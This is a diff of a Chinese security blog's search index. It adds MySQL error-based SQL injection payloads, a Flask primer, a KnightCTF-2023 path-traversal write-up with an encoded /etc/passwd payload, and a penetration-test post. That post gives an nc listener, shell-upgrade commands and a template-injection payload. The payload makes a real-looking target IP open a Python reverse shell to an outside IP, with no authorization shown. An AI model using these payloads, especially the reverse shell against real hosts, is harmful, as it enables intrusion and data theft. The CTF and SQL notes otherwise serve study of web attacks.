-<h4 id="bao-cuo-zhu-ru-yuan-li"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理<a href="#bao-cuo-zhu-ru-yuan-li" class="header-anchor">#</a></h4><p>前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的，那么我们都有哪些特殊函数以及如何使用它们呢？</p>
+<h4 id="bao-cuo-zhu-ru-ge-han-shu-yuan-li"><a href="#报错注入各函数原理" class="headerlink" title="报错注入各函数原理"></a>报错注入各函数原理<a href="#bao-cuo-zhu-ru-ge-han-shu-yuan-li" class="header-anchor">#</a></h4><p>前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的，那么我们都有哪些特殊函数以及如何使用它们呢？</p>
 <h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()<a href="#exp" class="header-anchor">#</a></h5><p>函数语法：<code>exp(int)</code></p>
 <p>适用版本：5.5.5~5.5.49</p>
 <p>该函数会返回 e 的 x 次方结果，如下图：</p>
@@ -2302,10 +2320,27 @@ ct&\equiv\,m^e\mod\,n,p^7|n\\
 <p>payload 用法：</p>
 <figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> count(*),<span class="number">2</span>,concat(<span class="string">&#x27;:&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">&#x27;:&#x27;</span>,floor(rand()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>
 
+<h4 id="ji-he-han-shu-bao-cuo-zhu-ru"><a href="#几何函数报错注入" class="headerlink" title="几何函数报错注入"></a>几何函数报错注入<a href="#ji-he-han-shu-bao-cuo-zhu-ru" class="header-anchor">#</a></h4><ul>
+<li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li>
+<li>polygon()：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li>
+<li>multipoint()：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li>
+<li>multilinestring()：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li>
+<li>linestring()：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li>
+<li>multipolygon() ：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b)</code></li>
+</ul>
+<h4 id="uuid-xiang-guan-han-shu"><a href="#uuid相关函数" class="headerlink" title="uuid相关函数"></a>uuid相关函数<a href="#uuid-xiang-guan-han-shu" class="header-anchor">#</a></h4><p>适用版本：8.0.x</p>
+<p>参数格式不正确。</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">SELECT</span> UUID_TO_BIN((<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=<span class="number">1</span>));</span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> BIN_TO_UUID((<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
 
+<h4 id="gtid-xiang-guan-han-shu"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数<a href="#gtid-xiang-guan-han-shu" class="header-anchor">#</a></h4><p>参数格式不正确。</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">mysql&gt;select gtid<span class="constructor">_subset(<span class="params">user</span>()</span>,<span class="number">1</span>);</span><br><span class="line">mysql&gt;select gtid<span class="constructor">_subset(<span class="params">hex</span>(<span class="params">substr</span>((<span class="params">select</span> <span class="operator">*</span> <span class="params">from</span> <span class="params">users</span> <span class="params">limit</span> 1,1)</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>);</span><br><span class="line">mysql&gt;select gtid<span class="constructor">_subtract((<span class="params">select</span> <span class="operator">*</span> <span class="params">from</span>(<span class="params">select</span> <span class="params">user</span>()</span>)a),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
 
+<h4 id="join-using-zhu-lie-ming"><a href="#join-using-注列名" class="headerlink" title="join using()注列名"></a>join using()注列名<a href="#join-using-zhu-lie-ming" class="header-anchor">#</a></h4><p>通过系统关键词join可建立两个表之间的内连接。</p>
+<p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p>
+<p>并且报错信息会存在重复的列名，可以使用 <strong>USING</strong> 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">mysql&gt;<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> * <span class="keyword">from</span> users)b)c;</span><br><span class="line">mysql&gt;<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> * <span class="keyword">from</span> users)b <span class="keyword">using</span>(username))c;</span><br><span class="line">mysql&gt;<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> * <span class="keyword">from</span> users)b <span class="keyword">using</span>(username,<span class="keyword">password</span>))c</span><br></pre></td></tr></table></figure>
 
-
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230120125951654.png" alt="image-20230120125951654"></p>
 <h2 id="rao-guo-guo-lu"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤<a href="#rao-guo-guo-lu" class="header-anchor">#</a></h2><h3 id="rao-guo-kong-ge-guo-lu"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤<a href="#rao-guo-kong-ge-guo-lu" class="header-anchor">#</a></h3><p>一般代替空格的字符串有</p>
 <ul>
 <li>%09</li>
@@ -9037,6 +9072,105 @@ ab\,mod(2^{31}-1) &= a(2^{i}+2^{j}+2^k)\,mod\,m\\
       </categories>
       <tags>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Flask</title>
+    <url>/2023/01/21/Flask/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>由于做题总是遇见这些框架，然后每次都去看文档，实在是累人，所以打算自己总结一个文档，把框架的字段、函数相关定义都记录一下。</p>
+<span id="more"></span>
+
+
+
+<h3 id="kuai-su-ru-men-flask"><a href="#快速入门-Flask" class="headerlink" title="快速入门 Flask"></a>快速入门 Flask<a href="#kuai-su-ru-men-flask" class="header-anchor">#</a></h3><blockquote>
+<p>推荐阅读：</p>
+<p><a href="https://flask.palletsprojects.com/en/2.2.x/quickstart/#a-minimal-application">https://flask.palletsprojects.com/en/2.2.x/quickstart/#a-minimal-application</a></p>
+</blockquote>
+<p>一个最小的Flask应用程序看起来是这样的:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;Hello, World!&lt;/p&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>以上代码做了什么呢？</p>
+<ol>
+<li>首先我们导入了 <code>Flask</code> 类，该类的一个实例将会是我们的 WSGI 应用。</li>
+<li>下一步我们创造了该类的一个实例，第一个参数是应用的模块或包的名字。<code>__name__</code> 是一个方便的快捷方式，适用于大多数情况。我们需要这个参数来告诉 Flask 去哪里寻找资源，比如 模板或静态文件</li>
+<li>然后我们使用 <code>route()</code> 装饰器告诉 Flask 什么 URL 应触发我们的函数</li>
+<li>函数会返回我们想在用户的浏览器上展示的信息，默认的 content type 是 HTML，所以在 string 中的 HTML 将会被浏览器渲染</li>
+</ol>
+<h3 id="zuo-ti-yu-dao-de-han-shu"><a href="#做题遇到的函数" class="headerlink" title="做题遇到的函数"></a>做题遇到的函数<a href="#zuo-ti-yu-dao-de-han-shu" class="header-anchor">#</a></h3><h4 id="current-app"><a href="#current-app" class="headerlink" title="current_app"></a>current_app<a href="#current-app" class="header-anchor">#</a></h4><p><img src="/images/Flask/image-20230121214129915.png" alt="image-20230121214129915"></p>
+<h4 id="root-path"><a href="#root-path" class="headerlink" title="root_path"></a>root_path<a href="#root-path" class="header-anchor">#</a></h4><p><img src="/images/Flask/image-20230121213946582.png" alt="image-20230121213946582"></p>
+<p>这个函数会返回当前 python 文件所属的包在文件系统中的绝对路径。注意并不会返回当前的 python 文件名</p>
+<p><img src="/images/Flask/image-20230121215538984.png" alt="image-20230121215538984"></p>
+<h4 id="open-resource"><a href="#open-resource" class="headerlink" title="open_resource"></a>open_resource<a href="#open-resource" class="header-anchor">#</a></h4><p><img src="/images/Flask/image-20230121213920678.png" alt="image-20230121213920678"></p>
+<h3 id="wen-dang-di-zhi"><a href="#文档地址" class="headerlink" title="文档地址"></a>文档地址<a href="#wen-dang-di-zhi" class="header-anchor">#</a></h3><p><a href="https://flask.palletsprojects.com/en/2.2.x/">https://flask.palletsprojects.com/en/2.2.x/</a></p>
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>Flask</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KnightCTF-2023</title>
+    <url>/2023/01/21/KnightCTF-2023/index.html</url>
+    <content><![CDATA[<!--toc-->
+<p>过年前的最后一个 CTF</p>
+<span id="more"></span>
+
+<h2 id="web"><a href="#Web" class="headerlink" title="Web"></a>Web<a href="#web" class="header-anchor">#</a></h2><h3 id="knight-search"><a href="#Knight-Search" class="headerlink" title="Knight Search"></a>Knight Search<a href="#knight-search" class="header-anchor">#</a></h3><p>随便看了下发现 post &#x2F;home 的时候会弹出一个 keyerror，说是缺少 filename 这个key。题目描述已经说了这是一个文件搜索题，所以猜测应该是传入文件名然后回显文件内容，并且测试 post 了 filename 确实不报错了，尽管没有内容。</p>
+<p>但是在报错信息中找到了当前的 python 文件名 app.py，post 这个文件名成功回显了文件的内容。</p>
+<p><img src="/images/KnightCTF-2023/image-20230121220233779.png" alt="image-20230121220233779"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, current_app</span><br><span class="line"><span class="keyword">import</span> os, urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    filename = urllib.parse.unquote(request.form[<span class="string">&#x27;filename&#x27;</span>])</span><br><span class="line">    data = <span class="string">&quot;Try Harder.....&quot;</span></span><br><span class="line">    naughty = <span class="string">&quot;../&quot;</span></span><br><span class="line">    <span class="keyword">if</span> naughty <span class="keyword">not</span> <span class="keyword">in</span> filename:</span><br><span class="line">        filename = urllib.parse.unquote(filename)</span><br><span class="line">        <span class="comment">#current_app.root_path 返回当前的python文件所在包的绝对路径</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(current_app.root_path + <span class="string">&#x27;/&#x27;</span>+ filename):</span><br><span class="line">            <span class="keyword">with</span> current_app.open_resource(filename) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, read = data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ahhhh</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;ahhh.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7777</span> , debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="crtoto"><a href="#Crtoto" class="headerlink" title="Crtoto"></a>Crtoto<a href="#crtoto" class="header-anchor">#</a></h2><h3 id="i-love-pi"><a href="#I-Love-Pi" class="headerlink" title="I Love Pi"></a>I Love Pi<a href="#i-love-pi" class="header-anchor">#</a></h3><h4 id="ti-mu-miao-shu"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述<a href="#ti-mu-miao-shu" class="header-anchor">#</a></h4><p>Isaac Newton left me this piece of code and a message. Can you help me decode this…</p>
+<p>Demo Flag : KCTF{FL4G_H3R3}</p>
+<p>Attachments: <a href="https://drive.google.com/file/d/19u0nKhoBRlB7_LVChloN0rlP-NJj8Mpy/view?usp=sharing">Link</a></p>
+<p>Author: sweet_dreams</p>
+<h4 id="ti-mu-nei-rong"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容<a href="#ti-mu-nei-rong" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">lengths = [--REDACTED - -]</span><br><span class="line">flag = <span class="string">&quot;KCTF&#123;*******************************&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># len(lengths) = 10</span></span><br><span class="line"><span class="comment"># len(flag) = 39</span></span><br><span class="line"></span><br><span class="line">s = <span class="number">0</span></span><br><span class="line">encoded_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lengths:</span><br><span class="line">    seg = flag[s:s + l]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seg)):</span><br><span class="line">        seg = base64.b64encode(seg.encode(<span class="string">&#x27;ascii&#x27;</span>)).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    s += l</span><br><span class="line">    encoded_flag += seg</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encoded_flag)</span><br></pre></td></tr></table></figure>
+
+<h4 id="ti-mu-fen-xi"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析<a href="#ti-mu-fen-xi" class="header-anchor">#</a></h4><p>可以看到题目每次从一个长度为10的列表中取出某个数a，然后从flag中取出长度为a的字串，并进行a次编码。解码很容易，但是题目没有将这个列表告诉我们，这就使得我们不知道每一轮被编码的字串的长度。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试-欧拉</title>
+    <url>/2023/01/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>过年的一次内网渗透</p>
+<span id="more"></span>
+
+
+
+<h4 id="an-zhuang-nps"><a href="#安装-nps" class="headerlink" title="安装 nps"></a>安装 nps<a href="#an-zhuang-nps" class="header-anchor">#</a></h4><p>把vps服务器的流量转到我们的本地kali上来。</p>
+<p><a href="https://www.moewah.com/archives/842.html">https://www.moewah.com/archives/842.html</a></p>
+<h3 id="ru-he-huo-qu-dao-yi-ge-zhen-zheng-de-shell-zhong-duan"><a href="#如何获取到一个真正的shell终端" class="headerlink" title="如何获取到一个真正的shell终端"></a>如何获取到一个真正的shell终端<a href="#ru-he-huo-qu-dao-yi-ge-zhen-zheng-de-shell-zhong-duan" class="header-anchor">#</a></h3><p><a href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html</a></p>
+<p><a href="https://blog.csdn.net/qq_40572277/article/details/104990616?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">Linux中使用ctrl+z停止任务后如何恢复任务</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">nc -lvp 9001</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ctrl Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">fg</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">stty</span> rows xx columns xxx</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="python-fan-dan-shell"><a href="#python-反弹shell" class="headerlink" title="python 反弹shell"></a>python 反弹shell<a href="#python-fan-dan-shell" class="header-anchor">#</a></h4><figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">http://121.37.186.22/?name=</span><span class="template-variable">&#123;&#123;url_for.__globals__.os.__dict__.popen(<span class="string">&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;</span><span class="number">47</span>.<span class="number">115</span>.<span class="number">222</span>.<span class="number">18</span>\<span class="string">&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;</span>/bin/sh\<span class="string">&quot;,\&quot;</span>-i\<span class="string">&quot;]);&#x27;&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="dang-qian-ip"><a href="#当前ip" class="headerlink" title="当前ip"></a>当前ip<a href="#dang-qian-ip" class="header-anchor">#</a></h5><p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181158143.png" alt="image-20230120181158143"></p>
+<h5 id="nei-he-xin-xi"><a href="#内核信息" class="headerlink" title="内核信息"></a>内核信息<a href="#nei-he-xin-xi" class="header-anchor">#</a></h5><p>发现是红帽</p>
+<p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181322429.png" alt="image-20230120181322429"></p>
+<h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a href="https://www.freebuf.com/articles/web/332083.html">Linux内网渗透——Linux信息收集与横向移动 - FreeBuf网络安全行业门户</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
 </search>
